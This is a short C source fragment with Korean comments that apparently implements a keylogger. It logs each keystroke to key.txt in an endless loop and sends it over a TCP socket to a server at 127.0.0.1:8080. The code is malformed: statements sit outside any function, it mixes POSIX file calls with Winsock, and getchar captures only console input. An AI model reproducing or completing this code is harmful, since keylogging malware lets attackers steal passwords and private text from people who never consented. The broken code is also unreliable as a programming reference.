#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <windows.h>
#include <winsock2.h>

// 윈도우 라이브러리 초기화
WSADATA wsa;
if (WSAStartup(MAKEWORD(2,2), &wsa) != 0)
{
    printf("WSAStartup 실패: %d\n", WSAGetLastError());
    return 1;
}

// key.txt 파일을 쓰기 모드로 열기
int fd = open("key.txt", O_WRONLY | O_CREAT, 0644);
if (fd == -1)
{
    perror("open");
    return 1;
}

// 서버에 접속하기 위한 소켓 생성
SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
if (sock == INVALID_SOCKET)
{
    printf("socket 실패: %d\n", WSAGetLastError());
    return 1;
}

// 서버에 접속
SOCKADDR_IN addr;
addr.sin_family = AF_INET;
addr.sin_port = htons(8080);
addr.sin_addr.S_un.S_addr = inet_addr("127.0.0.1");
if (connect(sock, (SOCKADDR*)&addr, sizeof(addr)) == SOCKET_ERROR)
{
    printf("connect 실패: %d\n", WSAGetLastError());
    return 1;
}

// 키보드 입력을 무한 루프로 읽기
while (1)
{
    // 키보드로부터 입력을 읽고 key.txt 파일에 출력
    char key = getchar();
    write(fd, &key, 1);
    fsync(fd);

    // 서버에 키보드 입력을 전송
    char buf[2] = {key, '\0'};
    send(sock, buf, strlen(buf), 0);
}

// 소켓과 파일 닫기
closesocket(sock);
close(fd);